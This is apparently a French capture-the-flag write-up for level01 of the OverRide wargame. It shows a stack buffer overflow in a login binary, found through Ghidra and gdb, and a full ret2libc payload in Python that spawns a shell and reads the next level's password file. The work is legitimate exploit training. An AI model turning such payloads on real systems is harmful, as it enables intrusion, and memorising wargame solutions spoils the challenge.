#Level 01

Pour ce niveau l'executable fournie est un petit programme de login demandant un username et un mot de passe

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: admin
verifying username....

nope, incorrect username...
```

Une fois le programme desassembler a l'aide de `ghidra` on peut voir qu'une fois l'input pour l'`username` recuperer avec `fgets` la fonction compare l'input avec la chaine de caractere `dat_will` ce qui nous donne l'username

Maintenant place au mot de passe en continuant de lire le code on s'apercoit que la verification du mot de passe n'est jamais utiliser le programme nous renverra toujours le message `nope, incorrect password...` peut importe notre input

La vulnerabilite se trouve sur cette ligne 

```c
fgets(user_password, 100, stdin);
```

La personne ayant ecrit ce code a definie la taille du buffer pour le mot de passe a `64 octets` mais une lecture de `100 octets`

Trouvons d'abord l'offset necessaire pour ecraser le pointeur de retour grace a [ce site](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)

```bash
(gdb) b *0x080485b5
Breakpoint 1 at 0x80485b5
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_will
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Breakpoint 1, 0x080485b5 in main ()
(gdb) continue 
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

Notre offset est donc de `80 octets`

On va utiliser la technique de `ret2libc` pour executer la fonction `system` avec comme argument `/bin/sh`

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

Notre payload pour le mot de passe ressemblera donc a :

```python
python -c 'print "A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'
```

```bash
level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
*****************************************
```